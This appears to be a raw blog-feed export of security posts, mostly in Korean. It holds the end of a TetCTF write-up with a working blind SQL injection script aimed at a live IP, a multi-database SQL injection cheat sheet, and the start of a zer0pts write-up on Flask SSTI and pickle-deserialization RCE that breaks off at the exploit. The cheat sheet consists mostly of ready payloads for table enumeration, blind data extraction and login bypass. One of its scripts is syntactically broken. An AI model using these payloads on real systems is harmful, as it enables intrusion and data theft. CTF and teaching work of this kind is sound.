class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, <code>t_fl4g_v3lue_su</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Summary</title>
      <link href="2021/01/02/2021-01-02-SQL-Injection-Summary/"/>
      <url>2021/01/02/2021-01-02-SQL-Injection-Summary/</url>
      
        <content type="html"><![CDATA[<p>Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.<br></p><hr><h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#35;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br><br>   <span style="color:#3E386D">→</span> &#59;&#37;00<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><hr><h2 id="Version-Check"><a href="#Version-Check" class="headerlink" title="Version Check"></a>Version Check</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> @@version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> select * from v$version<br><br><span style="color:#3E386D">→</span> select version from product_component_version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> sqlite_version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><hr><h2 id="Union-Based-SQL-Injection"><a href="#Union-Based-SQL-Injection" class="headerlink" title="Union Based SQL Injection"></a>Union Based SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(table_name), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(column_name), null, null, null from information_schema.columns<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select db_name(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null, null, null from  (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 4 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null from (select top 1 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 2 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 3 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 4 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select &#60;column_name&#62;, null, null, null from &#60;table_name&#62;<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select string_agg(db_name(),&#39;,&#39;), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name,&#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39;union select string_agg(column_name,&#39;,&#39;), null, null, null from information_schema.columns where table_name=’&#60;table_name&#62;’<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;,&#39;,&#39;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null from dual<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select LISTAGG(table_name,&#39;,&#39;) WITHIN GROUP(ORDER BY table_name), null<br>FROM user_tables<br><br><span style="color:#3E386D">→</span> &#39; union select null, LISTAGG(column_name,&#39;,&#39;) WITHIN GROUP(ORDER BY column_name) from cols<br><br><span style="color:#3E386D">→</span> &#39; union select LISTAGG(&#60;column_name&#62;,&#39;,&#39;) WITHIN GROUP(ORDER BY &#60;column_name&#62;) AS result, null<br>FROM &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select sqlite_version(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(sql), group_concat(name), null, null from sqlite_master<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), group_concat(&#60;column_name&#62;), null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select current_database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name, &#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name = &#60;table_name&#62;<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;</p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><hr><h2 id="Boolean-Based-Blind-SQL-Injection"><a href="#Boolean-Based-Blind-SQL-Injection" class="headerlink" title="Boolean Based Blind SQL Injection"></a>Boolean Based Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or if(length(database())  &gt;N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if(ascii(substr(database(),1,1)) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(table_name) from information_schema.tables) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(table_name,1,1)) from information_schema.tables) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(column_name) from information_schema.columns where table_name = &#60;table_name&#62;) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select length(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(&#60;column_name&#62;,1,1)) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br></p></blockquote><hr><h2 id="Efficient-Blind-SQL-Injection"><a href="#Efficient-Blind-SQL-Injection" class="headerlink" title="Efficient Blind SQL Injection"></a>Efficient Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">condition result = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">range</span>):</span><br><span class="line">  binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27;or substr(lpad(bin(ascii(substr(database(), i, 1))), 7, 0), j, 1)%23&quot;</span></span><br><span class="line">    res = requests.get(url + query)</span><br><span class="line">    <span class="keyword">if</span> condition <span class="keyword">in</span> res.text:</span><br><span class="line">      binary += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      binary += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">  result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;[+] Result : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br></pre></td></tr></table></figure><hr><h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLite</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1==1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;-<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br></p></blockquote><hr><h2 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> pow(<del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as id), 9999)<br><span style="color:#3E386D">→</span> exp(</del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as a) * 9999)</p></blockquote><p><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 테이블의 존재하는 모든 칼럼을 에러에 포함시켜 출력시킬 수 있습니다. 대신 테이블 이름과 칼럼 이름을 하나 알고 있어야 합니다.</strong><br></p><blockquote><p><span style="color:#3E386D">→</span> select extractvalue(rand(),concat(0x3a,((select &#60;column_name&#62; from &#60;table_name&#62; limit 0, 1))))<br><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 컬럼 값을 에러에 포함시켜 출력시킬 수 있습니다.</strong></p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-zer0pts-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h2 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h2><blockquote><p>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</p></blockquote><p><span style="color:#631F9C">&#62;</span> SSTI Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true"><br>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</p><p><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.12.42.png?raw=true"><br>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</p><p>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 